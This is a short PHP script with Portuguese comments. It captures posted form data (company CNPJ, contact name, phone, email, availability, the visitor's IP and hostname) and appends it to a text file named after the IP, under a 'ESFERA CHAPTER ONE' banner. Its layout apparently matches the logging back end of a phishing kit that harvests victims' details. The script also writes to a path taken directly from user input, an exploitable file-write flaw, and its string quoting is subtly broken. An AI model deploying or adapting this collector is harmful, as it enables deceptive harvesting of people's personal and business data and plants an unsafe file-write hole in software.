﻿﻿<?php
date_default_timezone_set('America/Sao_Paulo');
//pega as variaveis por POST

$ip = @$_POST['ip'];
$cnpj = @$_POST['cnpj'];
$nome = @$_POST['responsavel'];
$tel = @$_POST['telefone'];
$horario = @$_POST['disponibilidade'];
$email = @$_POST['email'];
$navegador = @$_SERVER['HTTP_USER_AGENT'];
$pcname = gethostbyaddr($ip);
$today = date("d/m/y"); 
$hora = date("H:i:s");
$myFile = $ip.".txt";
$fh = fopen($myFile, 'a') or die("can't open file");

$stringData = "
--------------INICIO--------------

ESFERA CHAPTER ONE | $today | $hora
@ ($pcname) 

CNPJ....: '.$cnpj.'
NOME RESPONSAVEL....: '.$nome.'
TELEFONE....: '.$tel.'
HORARIO PARA CONTATO....: '.$horario.'
EMAIL....: '.$email.'

----------------------------------
";


fwrite( $fh, $stringData );
fclose( $fh );
?>